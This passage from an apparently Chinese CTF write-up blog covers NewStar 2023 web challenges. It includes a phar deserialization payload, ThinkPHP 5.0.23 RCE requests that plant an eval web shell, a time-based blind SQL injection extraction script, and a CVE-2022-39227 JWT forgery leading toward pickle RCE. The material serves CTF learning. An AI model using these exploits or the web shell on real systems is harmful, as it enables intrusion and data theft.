class="variable">$God</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">story</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip, urllib.parse, requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://87f4ec66-e850-47fc-a734-116600759b85.node5.buuoj.cn:81/pairing.php&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8083&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://127.0.0.1:8083&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;phar.jpg&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">s = data[:-<span class="number">28</span>]</span><br><span class="line">h = data[-<span class="number">8</span>:]</span><br><span class="line">fixed = s + sha1(s).digest() + h</span><br><span class="line"></span><br><span class="line">compressed = gzip.compress(fixed)</span><br><span class="line">encoded = urllib.parse.quote_from_bytes(compressed)</span><br><span class="line"></span><br><span class="line">pear_path = <span class="string">&quot;/var/www/html/a.jpg&quot;</span></span><br><span class="line">apple_path = <span class="string">&quot;phar:///var/www/html/a.jpg/test.txt&quot;</span></span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;pear&quot;</span>: pear_path,</span><br><span class="line">    <span class="string">&quot;apple&quot;</span>: apple_path</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url+<span class="string">f&quot;?pear=<span class="subst">&#123;pear_path&#125;</span>&amp;apple=<span class="subst">&#123;apple_path&#125;</span>&quot;</span>, data=encoded, proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/newstar2023/PixPin_2025-08-09_17-36-14.png" alt="1"></p><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>TP5.0.23RCE</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=captcha</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>181</span><br><span class="line"></span><br><span class="line"><span class="language-oxygene">_method=__construct&amp;filter[]=phpinfo&amp;<span class="keyword">method</span>=<span class="title function_">get</span>&amp;<span class="title function_">server</span>[<span class="title function_">REQUEST_METHOD</span>]=1</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=captcha</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>181</span><br><span class="line"></span><br><span class="line"><span class="language-php-template"><span class="language-xml">_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo%20&#x27;</span><span class="language-php"><span class="meta">&lt;?php</span>%<span class="number">20</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;%20&gt;%20/var/www/public/shell.php</span></span></span><br></pre></td></tr></table></figure><p>链接上来发现没有权限读取根目录的flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> <span class="string">&quot;/flag_dd3f6380aa0d&quot;</span> /dev/stdout</span><br></pre></td></tr></table></figure><h2 id="Final-round"><a href="#Final-round" class="headerlink" title="Final round"></a>Final round</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/comments.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>12</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">name</span>=<span class="number">1</span>%<span class="number">0</span>band%<span class="number">0</span>bif(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span></span><br></pre></td></tr></table></figure><p>成功延时，写脚本的时候发现误导很多，他有很多表和列，最后的时候还不能直接查text，不然应该会更快点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81/comments.php&quot;</span></span><br><span class="line">SLEEP, TH = <span class="number">3</span>, <span class="number">2.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tpl = &quot;1%0band%0bif(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"><span class="comment"># wfy</span></span><br><span class="line"><span class="comment"># tpl = &quot;1%0band%0bif(ascii(substr((select%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=&#x27;wfy&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"><span class="comment"># tpl = &quot;1%0band%0bif(ascii(substr((select%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"><span class="comment"># wfy_admin,wfy_comments,wfy_information</span></span><br><span class="line"><span class="comment"># tpl = &quot;1%0band%0bif(ascii(substr((select%0bgroup_concat(column_name)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#x27;wfy_admin&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"><span class="comment"># Id,username,password,cookie</span></span><br><span class="line"><span class="comment"># tpl = &quot;1%0band%0bif(ascii(substr((select%0bgroup_concat(column_name)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#x27;wfy_comments&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"><span class="comment"># id,text,user,name,display</span></span><br><span class="line"><span class="comment"># tpl = &quot;1%0band%0bif(ascii(substr((select%0bgroup_concat(id)%0bfrom%0bwfy.wfy_comments),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"><span class="comment"># 1,2,3,4,5,6,7,8,9,10,11,100</span></span><br><span class="line"><span class="comment"># tpl = &quot;1%0band%0bif(ascii(substr((select%0bgroup_concat(user)%0bfrom%0bwfy.wfy_comments%0bwhere%0bid=100),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"><span class="comment"># f1ag_is_here</span></span><br><span class="line">tpl = <span class="string">&quot;1%0band%0bif(ascii(substr((select%0bgroup_concat(text)%0bfrom%0bwfy.wfy_comments%0bwhere%0bid=100),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line">sess.trust_env = <span class="literal">False</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    lo, hi = <span class="number">32</span>, <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        payload = tpl.<span class="built_in">format</span>(i=i, mid=mid, SLEEP=SLEEP)</span><br><span class="line">        t0 = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sess.post(url, headers=headers, data=<span class="string">f&quot;name=<span class="subst">&#123;payload&#125;</span>&quot;</span>.encode(), timeout=<span class="number">8</span>, proxies=&#123;<span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            lo = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        dt = time.time() - t0</span><br><span class="line">        <span class="keyword">if</span> dt &gt;= TH:</span><br><span class="line">            lo = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hi = mid</span><br><span class="line">    <span class="keyword">if</span> lo == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += <span class="built_in">chr</span>(lo)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Ye’s-Pickle"><a href="#Ye’s-Pickle" class="headerlink" title="Ye’s Pickle"></a>Ye’s Pickle</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> jwcrypto.jwk <span class="keyword">as</span> jwk</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>(<span class="params">length=<span class="number">16</span></span>):</span><br><span class="line">    characters = string.ascii_letters + string.digits  <span class="comment"># 包含字母和数字</span></span><br><span class="line">    random_string = <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = generate_random_string(<span class="number">16</span>)</span><br><span class="line">key = jwk.JWK.generate(kty=<span class="string">&#x27;RSA&#x27;</span>, size=<span class="number">2048</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    payload=request.args.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        token=verify_jwt(payload, key, [<span class="string">&#x27;PS256&#x27;</span>])</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=token[<span class="number">1</span>][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=<span class="string">&quot;guest&quot;</span></span><br><span class="line">        user=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;boogipop&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">        jwt = generate_jwt(user, key, <span class="string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="number">60</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,token=jwt)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pickle&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unser</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;role&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        pickle.loads(base64.b64decode(request.args.get(<span class="string">&quot;pickle&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用<strong>CVE-2022-39227</strong>伪造JWT，然后再进行pickle反序列化，反弹shell即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_decode, base64url_encode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">topic</span>(<span class="params">topic</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span></span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    parsed_payload[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">originaltoken = <span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTQ3NDA1OTYsImlhdCI6MTc1NDczNjk5NiwianRpIjoiWVo0bVRoNUp3YkJOLVo5ZGtuQmVWUSIsIm5iZiI6MTc1NDczNjk5Niwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.bYfPO-i3FyBWKqt7Gv1utivA-3LvYZb9cPPZtrj4YAp-rXnAFLe9lOx2Uzj7kBr2TOM-kjBi4omYezR-xbPlmieN9vcT4zkoVpyNirJSckcoyZH9oUxJPl4ASZgBNtbtQdTnOgqyRULRF6RAk8HOXT-U9mVO437OMg85L_U2dxSVveZRsQ8xDxDIS0rAG0AaHzpmKr_MPYOBzVQBoYcsofwlEnZGiYq30A1fDncd4lf0entWrOiSeYhR5uSZ-cYWXfpSRR0ALmflA47ea0kJpfHzVxrGc0kLOiPgetSReAmExyVxS3bc5MqUSXzUUiDfcNla-rYX1lhBybsAR84Pdg&#x27;</span></span><br><span class="line">topic = topic(originaltoken)</span><br><span class="line"><span class="built_in">print</span>(topic)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?token=%7B%22++eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTQ3NDA1OTYsImlhdCI6MTc1NDczNjk5NiwianRpIjoiWVo0bVRoNUp3YkJOLVo5ZGtuQmVWUSIsIm5iZiI6MTc1NDczNjk5Niwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.%22%3A%22%22%2C%22protected%22%3A%22eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9%22%2C+%22payload%22%3A%22eyJleHAiOjE3NTQ3NDA1OTYsImlhdCI6MTc1NDczNjk5NiwianRpIjoiWVo0bVRoNUp3YkJOLVo5ZGtuQmVWUSIsIm5iZiI6MTc1NDczNjk5Niwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9%22%2C%22signature%22%3A%22bYfPO-i3FyBWKqt7Gv1utivA-3LvYZb9cPPZtrj4YAp-rXnAFLe9lOx2Uzj7kBr2TOM-kjBi4omYezR-xbPlmieN9vcT4zkoVpyNirJSckcoyZH9oUxJPl4ASZgBNtbtQdTnOgqyRULRF6RAk8HOXT-U9mVO437OMg85L_U2dxSVveZRsQ8xDxDIS0rAG0AaHzpmKr_MPYOBzVQBoYcsofwlEnZGiYq30A1fDncd4lf0entWrOiSeYhR5uSZ-cYWXfpSRR0ALmflA47ea0kJpfHzVxrGc0kLOiPgetSReAmExyVxS3bc5MqUSXzUUiDfcNla-rYX1lhBybsAR84Pdg%22%7D%0A</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>2f979ecd-6523-4667-920b-952d10787cb4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJyb2xlIjoiZ3Vlc3QifQ.aJcpRw.vYpg4Q0XL9337e8MB6kQKifcm28</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://2f979ecd-6523-4667-920b-952d10787cb4.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span 